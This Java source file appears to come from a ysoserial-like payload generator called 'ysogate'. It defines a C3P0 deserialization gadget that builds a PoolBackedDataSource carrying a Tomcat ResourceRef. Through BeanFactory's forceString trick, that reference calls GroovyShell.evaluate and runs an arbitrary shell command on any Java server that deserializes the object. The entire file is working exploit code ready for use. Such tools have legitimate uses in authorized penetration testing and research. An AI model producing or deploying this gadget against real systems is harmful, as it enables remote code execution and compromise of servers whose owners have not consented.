package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Reflections;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * 同 C3P0 2 只不过使用了 Groovy
 */
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35", "org.codehaus.groovy:groovy:2.3.9"})
public class C3P03 implements CommandObjectPayload<Object>
{

	public Object getObject(String command) throws Exception {
		PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
		Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(command));
		return b;
	}


	private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

		private final String cmd;

		public PoolSource(String cmd) {
			this.cmd = cmd;
		}

		public Reference getReference() throws NamingException {
			ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
			ref.add(new StringRefAddr("forceString", "su18=evaluate"));
			ref.add(new StringRefAddr("su18", "'" + cmd + "'.execute()"));
			return ref;
		}

		public PrintWriter getLogWriter() throws SQLException {
			return null;
		}

		public void setLogWriter(PrintWriter out) throws SQLException {
		}

		public void setLoginTimeout(int seconds) throws SQLException {
		}

		public int getLoginTimeout() throws SQLException {
			return 0;
		}

		public Logger getParentLogger() throws SQLFeatureNotSupportedException {
			return null;
		}

		public PooledConnection getPooledConnection() throws SQLException {
			return null;
		}

		public PooledConnection getPooledConnection(String user, String password) throws SQLException {
			return null;
		}
		public static void main ( final String[] args ) throws Exception {
			PayloadRunner.run(C3P03.class, args);
		}
	}
}